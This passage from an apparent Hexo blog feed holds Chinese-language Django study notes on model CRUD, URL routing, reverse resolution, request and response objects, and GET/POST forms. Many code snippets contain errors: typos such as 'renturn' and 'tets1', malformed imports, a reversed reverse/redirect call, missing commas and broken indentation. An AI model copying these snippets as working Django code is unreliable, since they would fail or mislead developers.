class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">   </span><br><span class="line">   <span class="comment"># 数据排序</span></span><br><span class="line">   Test.objects.order_by(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">   </span><br><span class="line">   <span class="comment"># 上面的方法可以连锁使用</span></span><br><span class="line">   Test.objects.<span class="built_in">filter</span>(name=<span class="string">&quot;dokey&quot;</span>).order_by(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">   </span><br><span class="line">   <span class="comment"># 输出所有数据</span></span><br><span class="line">   <span class="keyword">for</span> var <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">   response1 += var.name + <span class="string">&quot; &quot;</span></span><br><span class="line">    response = response1</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;&lt;p&gt;&quot;</span> + response + <span class="string">&quot;&lt;/p&gt;&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h4><p>修改数据可以使用save()或update()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> TestModel,models <span class="keyword">import</span> Test</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testdb</span>(<span class="params">request</span>):</span><br><span class="line">   test1 = Test.objects.get(<span class="built_in">id</span>=<span class="number">1</span>)</span><br><span class="line">   test1.name = <span class="string">&quot;Okay Dokey&quot;</span></span><br><span class="line">   test1.save()</span><br><span class="line">   </span><br><span class="line">   <span class="comment"># 第二种方式</span></span><br><span class="line">   Test.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=<span class="number">1</span>).update(name=<span class="string">&quot;Okay Dokey yo&quot;</span>)</span><br><span class="line">   </span><br><span class="line">   <span class="comment"># 修改所有的列</span></span><br><span class="line">   Test.objects.<span class="built_in">all</span>().update(name=<span class="string">&quot;Dokey&quot;</span>)</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span> HttpResponse(<span class="string">&quot;&lt;p&gt;修改成功！&lt;/p&gt;&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h4><p>删除数据库中的对象只需调用该对象的delete()方法即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> django TestModel.models <span class="keyword">import</span> Test</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testdb</span>(<span class="params">request</span>):</span><br><span class="line">tets1 = Test.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=<span class="number">1</span>)</span><br><span class="line">    test1.delete()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 第二种方式</span></span><br><span class="line">    Test.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=<span class="number">1</span>).delete()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 删除所有数据</span></span><br><span class="line">    Test.objects.<span class="built_in">all</span>().delete()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;&lt;p&gt;删除成功！&lt;/p&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Django </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Django学习笔记-05</title>
      <link href="/9107.html"/>
      <url>/9107.html</url>
      
        <content type="html"><![CDATA[<h1 id="Django-路由"><a href="#Django-路由" class="headerlink" title="Django 路由"></a>Django 路由</h1><p>路由简单来说就是根据用户请求的URL链接来判断对应的处理程序，并返回处理结果，也就是URL与Django的视图建立映射关系。<br>Django路由在urls.py配置，urls.py中的每一条配置对应相应的处理方法。</p><h4 id="Django-不同版本urls-py配置有点不一样："><a href="#Django-不同版本urls-py配置有点不一样：" class="headerlink" title="Django 不同版本urls.py配置有点不一样："></a>Django 不同版本urls.py配置有点不一样：</h4><h3 id="Django-1-1-x版本"><a href="#Django-1-1-x版本" class="headerlink" title="Django 1.1.x版本"></a>Django 1.1.x版本</h3><p><strong>url()方法：</strong>普通路径和正则路径均可使用，需要自己手动添加正则首位限制符号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from django.conf.urls import url</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">url(r&#x27;^%admin/$&#x27;, admin.site.urls),</span><br><span class="line">   url(r&#x27;^index/$&#x27;, views.index), #普通路径</span><br><span class="line">        url(r&#x27;^articles/([0-9]&#123;4&#125;)/$&#x27;, views.articles) #正则路径</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="Django-2-2-x之后的版本"><a href="#Django-2-2-x之后的版本" class="headerlink" title="Django 2.2.x之后的版本"></a>Django 2.2.x之后的版本</h3><ul><li>path：用于普通路径，不需要自己手动添加正则首位限制符号，底层已经添加。</li><li>re_path:用于正则路径，需要自己手动添加正则首位限制符号。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from django.urls import re_path</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">path(&#x27;admin/&#x27;, admin.site.urls),</span><br><span class="line">    path(&#x27;index/&#x27;,views.index), #普通路径</span><br><span class="line">    re_path(r&#x27;^articles/[0-9]&#123;4&#125;/$&#x27;, views.articles), #正则路径</span><br><span class="line">]</span><br></pre></td></tr></table></figure><strong>总结：</strong>Django1.1.x版本中的url和Django2.2.x版本中的re_path用法相同。</li></ul><h2 id="正则路径中的分组"><a href="#正则路径中的分组" class="headerlink" title="正则路径中的分组"></a>正则路径中的分组</h2><h3 id="正则路径中的无名分组"><a href="#正则路径中的无名分组" class="headerlink" title="正则路径中的无名分组"></a>正则路径中的无名分组</h3><p>无名分组按位置传参,一一对应.<br>views.py中除了request,其他形参的数量要与urls中的分组数量一致.</p><h4 id="urls-py-文件代码"><a href="#urls-py-文件代码" class="headerlink" title="urls.py 文件代码"></a>urls.py 文件代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> re_path</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;admin/&#x27;</span>, admin.site.urls),</span><br><span class="line">    re_path(<span class="string">r&#x27;index/([0-9]&#123;4&#125;)/$&#x27;</span>, views.index),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h4 id="views-py-文件代码"><a href="#views-py-文件代码" class="headerlink" title="views.py 文件代码"></a>views.py 文件代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request, year</span>):</span><br><span class="line">    <span class="built_in">print</span>(year) <span class="comment"># 一个形参代表路径中一个分组的内容,按顺序匹配</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;Dokey&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="正则路径中的有名分组"><a href="#正则路径中的有名分组" class="headerlink" title="正则路径中的有名分组"></a>正则路径中的有名分组</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法: (?P&lt;组名&gt;正则表达式)</span><br></pre></td></tr></table></figure><p>有名分组按关键字传参,与位置顺序无关.<br>views.py中除了request,其他形参的数量要与urls中的分组数量一致,并且views中的形参名称要与urls中的组名对应.</p><h4 id="urls-py-文件代码-1"><a href="#urls-py-文件代码-1" class="headerlink" title="urls.py 文件代码"></a>urls.py 文件代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> re_path</span><br><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views  </span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">r&#x27;admin/&#x27;</span>, admin.site.urls),</span><br><span class="line">    re_path(<span class="string">&#x27;^index/(?P&lt;year&gt;[0-9]&#123;4&#125;)/(?P&lt;month&gt;[0-9]&#123;2&#125;)/$&#x27;</span>, views.index)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="路由分发"><a href="#路由分发" class="headerlink" title="路由分发"></a>路由分发</h3><p><strong>存在问题:</strong> Django项目中多个app目录共用一个urls容易造成混淆,后期维护也不方便.<br><strong>解决:</strong> 使用路由分发(include),让每个app目录都单独拥有自己的urls.<br><strong>步骤:</strong></p><ol><li>让每个app目录里都创建一个urls.py文件.  </li><li>在项目名称目录下的urls文件里,同意将路径分给各个app目录.  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path, include</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;admin/&#x27;</span>, admin.site.urls),</span><br><span class="line">    path(<span class="string">&quot;app01&quot;</span>, include(<span class="string">&quot;app01.urls&quot;</span>)),</span><br><span class="line">    path(<span class="string">&quot;app02&quot;</span>, include(<span class="string">&quot;app02.urls&quot;</span>)),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>在各自app目录下,写自己的urls.py文件,进行路由跳转.</li></ol><h4 id="app01目录"><a href="#app01目录" class="headerlink" title="app01目录:"></a>app01目录:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path,re_path</span><br><span class="line"><span class="keyword">from</span> app01 <span class="keyword">import</span> views <span class="comment"># 从自己的app目录引入views</span></span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    re_path(<span class="string">r&#x27;^login/(?P&lt;m&gt;[0-9]&#123;2&#125;)/$&#x27;</span>, views.index,),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h4 id="app02目录"><a href="#app02目录" class="headerlink" title="app02目录:"></a>app02目录:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path, re_path</span><br><span class="line"><span class="keyword">from</span> app02 <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    re_path(<span class="string">r&#x27;^xxx/(?P&lt;n&gt;[0-9]&#123;4&#125;)/$&#x27;</span>, views.xxx),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="反向解析"><a href="#反向解析" class="headerlink" title="反向解析"></a>反向解析</h3><p>随着功能的增加,路由层的url发生变化,就需要去更改对应的视图层和模板层的url,不便维护.<br>这时我们可以利用方向解析,当路由层url发生变化,在视图层和模板层动态反向解析出更改后的url,免去修改的操作.<br>反向解析一般用在模板中的超链接及视图中的重定向.</p><h4 id="普通路径"><a href="#普通路径" class="headerlink" title="普通路径"></a>普通路径</h4><p>在urls.py中给路由起别名, <strong>name&#x3D;”路由别名”</strong>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path(&#x27;login/&#x27;,views.login, name=&quot;login&quot;)</span><br></pre></td></tr></table></figure><p>在views.py中,从django.urls中引入reverse,利用 <strong>reverse(“路由别名”)</strong> 反向解析.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from django.http import HttpResponse</span><br><span class="line">from django.shortcuts import render,redirect, reverse</span><br><span class="line"></span><br><span class="line">def login(request):</span><br><span class="line">    if request.method == &#x27;GET&#x27;:</span><br><span class="line">        renturn HttpResponse(&quot;Okay Dokey&quot;)</span><br><span class="line">    else:</span><br><span class="line">        username = request.POST.get(&quot;username&quot;)</span><br><span class="line">        pwd = request.POST.get(&quot;pwd&quot;)</span><br><span class="line">        if username == &#x27;Okay&#x27; and pwd == &#x27;Dokey&#x27;:</span><br><span class="line">            return HttpResponse(&quot;Okay Dokey yo&quot;)</span><br><span class="line">        else:</span><br><span class="line">            return reverse(redirect(&#x27;login&#x27;))</span><br></pre></td></tr></table></figure><p>反向解析语法.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 反向解析语法</span><br><span class="line">&#123;% url &quot;路由别名&quot; %&#125;</span><br></pre></td></tr></table></figure><p>在templates中</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>用户登录<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&#123;% url name=&quot;</span><span class="attr">login</span>&quot; %&#125;&quot; <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>用户名: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>密码: <span class="tag">&lt;<span class="name">input</span> <span class="attr">tyep</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pwd&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Django </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Django学习笔记-04</title>
      <link href="/58194.html"/>
      <url>/58194.html</url>
      
        <content type="html"><![CDATA[<h1 id="Django视图"><a href="#Django视图" class="headerlink" title="Django视图"></a>Django视图</h1><h2 id="视图层"><a href="#视图层" class="headerlink" title="视图层"></a>视图层</h2><p>视图函数简称视图，是一个简单Python函数，它接受Web请求并且返回Web响应。<br>响应可以是一个HTML页面、一个404错误页面、重定向页面、XML文档。<br>每个视图函数都负责返回一个HttpResponse对象，对象中包含生成的响应。</p><p>视图层中有两个重要的对象：请求对象（request）与响应对象（HttpResponse）。</p><h3 id="请求对象：HttpRequest对象（简称request对象）"><a href="#请求对象：HttpRequest对象（简称request对象）" class="headerlink" title="请求对象：HttpRequest对象（简称request对象）"></a>请求对象：HttpRequest对象（简称request对象）</h3><ol><li><h4 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h4></li></ol><p> 数据类型是QueryDict,一个类似于字典的对象，包含HTTP GET的所有参数。<br> 取值格式：<strong>对象.方法</strong><br>     <strong>get()：</strong>返回字符串，如果该键对应有多个值，取出该键的最后一个值<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def runoob(request):</span><br><span class="line">name = request.GET.get(&quot;name&quot;)</span><br><span class="line">   return HttpResponse(&#x27;姓名：&#123;&#125;&#x27;.format(name))</span><br></pre></td></tr></table></figure><br> 2. #### POST<br> 常用于form表单，form表单里的标签name属性对应参数的键，value属性对应参数的值<br> 取值格式：<strong>对象.方法</strong><br>     <strong>get()：</strong>返回字符串，如果该键对应有多个值，取出该键的最后一个值。<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def runoob(request):</span><br><span class="line">name = request.POST.get(&quot;name&quot;)</span><br><span class="line">   return HttpResponse(&quot;姓名：&#123;&#125;&quot;.format(&quot;name&quot;))</span><br></pre></td></tr></table></figure><br> 3. #### body<br> 数据类型是二进制字节流，是原生请求体里的参数内容，在HTTP中用于POST，因为GET没有请求体。<br> 在处理非HTTP形式的报文时非常有用，例如：二进制图片、XML、Json等。<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def runoob(request):</span><br><span class="line">name request.body</span><br><span class="line">   print(name)</span><br><span class="line">   return HttpResponse(&quot;Okay Dokey&quot;)</span><br></pre></td></tr></table></figure><br> 4. #### Path<br> 获取URL中的路径部分，数据类型是字符串。<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def runoob(request):</span><br><span class="line">name = request.path</span><br><span class="line">   print(name)</span><br><span class="line">   return HttpResponse(&quot;Okay Dokey&quot;)</span><br></pre></td></tr></table></figure><br> 5. #### method<br> 获取当前请求的方式，数据类型是字符串，且结果为大写。<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def runoob(request):</span><br><span class="line">name = request.method</span><br><span class="line">   print(name)</span><br><span class="line">   return HttpResponse(&quot;Okay Dokey&quot;)</span><br></pre></td></tr></table></figure></p><h3 id="响应对象：HttpResponse对象"><a href="#响应对象：HttpResponse对象" class="headerlink" title="响应对象：HttpResponse对象"></a>响应对象：HttpResponse对象</h3><p> 响应对象主要有三种形式：HttpResponse()、render()、redirect()。<br>     <strong>HttpResponse()：</strong>返回文本，参数为字符串，字符串中写文本内容。如果参数为字符串里含有html标签，也可以渲染。<br>     <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def runoob(request):</span><br><span class="line">return HttpResponse(&quot;&lt;a herf=&#x27;https://www.baidu.com&#x27;&gt;Okay Dokey&lt;/a&gt;&quot;)</span><br></pre></td></tr></table></figure><br>    <strong>render()：</strong>返回文本，第一个参数为request，第二个参数为字符串（页面名称）,第三个参数为字典（可选参数，向页面传递的参数：键为页面参数名，值为views参数名）。<br>    <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def runoob(request):</span><br><span class="line">name = &quot;Okay Dokey&quot;</span><br><span class="line">    return render(request, &#x27;runoob.html&#x27;, &#123;&quot;name&quot;: name&#125;)</span><br></pre></td></tr></table></figure><br>    <strong>redirect：</strong>重定向，跳转新页面。参数为字符串，字符串中填写页面路径。一般用于form表单提交后，跳转到新页面。<br>    <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def runoob(request):</span><br><span class="line">return redirect(&quot;/index/&quot;)</span><br></pre></td></tr></table></figure><br>render和redirect是在HttpResponse的基础上进行了封装：</p><ul><li>render：底层返回的也是HttpResponse对象</li><li>redirect:底层继承的是HttpResponse对象</li></ul>]]></content>
      
      
      <categories>
          
          <category> Django </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Django学习笔记-03</title>
      <link href="/8467.html"/>
      <url>/8467.html</url>
      
        <content type="html"><![CDATA[<h1 id="Django表单"><a href="#Django表单" class="headerlink" title="Django表单"></a>Django表单</h1><h2 id="HTTP-请求"><a href="#HTTP-请求" class="headerlink" title="HTTP 请求"></a>HTTP 请求</h2><p>HTTP协议以”请求 - 回复”的方式工作。客户发送请求时，可以在请求中附加数据。服务器通过解析请求，就可以获得客户传来的数据，并根据URL来提供特定的服务</p><h3 id="GET-方法"><a href="#GET-方法" class="headerlink" title="GET 方法"></a>GET 方法</h3><p>视图显示（search_form.html）和请求处理分成两个函数（search_form、search）处理</p><h4 id="search-py-文件代码"><a href="#search-py-文件代码" class="headerlink" title="search.py 文件代码"></a>search.py 文件代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HTTPResponse</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_form</span>(<span class="params">request</span>):</span><br><span class="line"><span class="keyword">return</span> render(request, <span class="string">&#x27;search_form.html&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">request</span>):</span><br><span class="line">request.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;q&#x27;</span> <span class="keyword">in</span> request.GET <span class="keyword">and</span> request.GET[<span class="string">&#x27;q&#x27;</span>]:</span><br><span class="line">        message = <span class="string">&quot;你搜索的内容为：&quot;</span> + request.GET[<span class="string">&#x27;q&#x27;</span>]</span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">        message = <span class="string">&quot;你提交了空表单&quot;</span></span><br><span class="line">       <span class="keyword">return</span> HTTPResponse(message)</span><br><span class="line">          </span><br></pre></td></tr></table></figure><h4 id="templates-x2F-search-form-html"><a href="#templates-x2F-search-form-html" class="headerlink" title="templates&#x2F;search_form.html"></a>templates&#x2F;search_form.html</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&#x27;utf-8&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Okay Dokey yo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/search/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;q&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;搜索&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><em>Tips：</em>action属性规定当提交表单时，向何处发送表单数据。</p><h4 id="urls-py-文件代码"><a href="#urls-py-文件代码" class="headerlink" title="urls.py 文件代码"></a>urls.py 文件代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views,search</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">url(<span class="string">r&#x27;^search_form/$&#x27;</span>, search.search_form)</span><br><span class="line">    url(<span class="string">r&#x27;^search/$&#x27;</span>, search.search)</span><br><span class="line">       <span class="comment">#path(&#x27;search_form/&#x27;, search.search_form)</span></span><br><span class="line">       <span class="comment">#path(&#x27;search/&#x27;, search.search)</span></span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="POST-方法"><a href="#POST-方法" class="headerlink" title="POST 方法"></a>POST 方法</h3><p>并用一个URL和处理函数，同时显示视图和处理请求。</p><h4 id="templates-x2F-search-post-html"><a href="#templates-x2F-search-post-html" class="headerlink" title="templates&#x2F;search_post.html"></a>templates&#x2F;search_post.html</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span 